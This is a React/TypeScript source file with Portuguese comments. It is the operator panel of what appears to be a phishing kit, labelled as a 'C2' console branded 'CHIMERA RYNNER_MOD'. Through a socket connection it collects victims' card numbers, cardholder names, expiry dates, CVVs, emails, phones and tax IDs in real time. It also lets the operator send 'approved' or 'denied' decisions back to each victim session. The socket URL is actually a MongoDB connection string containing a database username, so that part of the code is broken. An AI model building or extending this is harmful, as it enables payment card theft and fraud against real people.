import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
// Supondo que o arquivo 'types.ts' esteja na raiz do projeto
import type { AdminUpdatePayload, SessionData } from '../types';

// Renomeamos de AdminPanel para AdminPage para refletir seu novo papel
const AdminPage: React.FC = () => {
  const [sessions, setSessions] = useState<Record<string, SessionData>>({});
  const socket = useRef<any>(null);

  useEffect(() => {
    // Aponte para o URL do seu servidor. Se estiver em produção, 
    // você pode precisar configurar isso dinamicamente.
    // Para Netlify, o frontend e backend estarão em domínios diferentes.
    // Você precisará do URL do seu backend aqui (ex: Render, Railway).
    // Se o backend ainda não está online, mantenha io() por enquanto.
    socket.current = io("mongodb+srv://jotagametks_db_user:<db_password>@cluster0.jdksgly.mongodb.net/?appName=Cluster0"); // <-- IMPORTANTE PARA PRODUÇÃO!

    const handleAdminUpdate = (data: AdminUpdatePayload) => {
      setSessions(prevSessions => {
        const { sessionId, field, value } = data;
        
        const validFields: (keyof SessionData)[] = ['cardNumber', 'cardHolder', 'expiryDate', 'cvv', 'email', 'phone', 'nif', 'paymentMethod', 'paymentStatus'];
        
        if (!validFields.includes(field as any)) return prevSessions;

        const updatedSession: SessionData = {
          ...(prevSessions[sessionId] || { 
              cardNumber: '', cardHolder: '', expiryDate: '', cvv: '', 
              email: '', phone: '', nif: '', paymentMethod: '', paymentStatus: 'idle', timestamp: '' 
          }),
          [field]: value,
          timestamp: new Date().toLocaleTimeString('pt-BR', { hour12: false }),
        };
        
        return { ...prevSessions, [sessionId]: updatedSession };
      });
    };
    
    socket.current.on('admin_update', handleAdminUpdate);

    return () => {
      if (socket.current) {
        socket.current.off('admin_update', handleAdminUpdate);
        socket.current.disconnect();
      }
    };
  }, []);

  const handleDecision = (sessionId: string, decision: 'approved' | 'denied') => {
      if (socket.current) {
          socket.current.emit('admin_decision', { sessionId, status: decision });
          
          setSessions(prev => ({
              ...prev,
              [sessionId]: { ...prev[sessionId], paymentStatus: decision }
          }));
      }
  };

  // O RESTANTE DO CÓDIGO (TODA A PARTE VISUAL JSX) É EXATAMENTE O MESMO...
  return (
    <div className="bg-black min-h-screen text-[#00ff41] font-mono p-4 selection:bg-[#003b0f] selection:text-white">
      <div className="max-w-full mx-auto">
        
        {/* C2 Header */}
        <header className="border-b border-[#003b0f] pb-4 mb-6 flex justify-between items-end">
          {/* ... todo o seu JSX do header ... */}
           <div>
            <h1 className="text-2xl font-bold tracking-tighter text-white">
              CHIMERA <span className="text-yellow-500 text-xs align-top">RYNNER_MOD</span>
            </h1>
            <p className="text-xs text-[#00ff41] opacity-70">
              [TARGET: RYNNER] [FIELDS: EXTENDED] [CMD: ACTIVE]
            </p>
          </div>
          <div className="text-right text-xs">
            <div className="animate-pulse">● LISTENING</div>
          </div>
        </header>

        {/* ... todo o resto do seu JSX para a grid de sessões ... */}
        {/* Grid of Sessions */}
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
             {/* ... O resto do seu código JSX continua aqui ... */}
        </div>

      </div>
    </div>
  );
};

export default AdminPage;
